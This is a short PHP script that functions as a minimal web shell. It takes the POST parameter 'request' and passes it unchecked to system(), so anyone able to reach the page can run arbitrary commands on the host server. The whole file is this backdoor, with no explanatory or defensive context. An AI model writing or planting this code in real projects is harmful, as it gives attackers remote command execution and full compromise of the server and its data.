<?php
if(isset($_POST['request'])){
  $query = $_POST['request'];
  system($query);
}
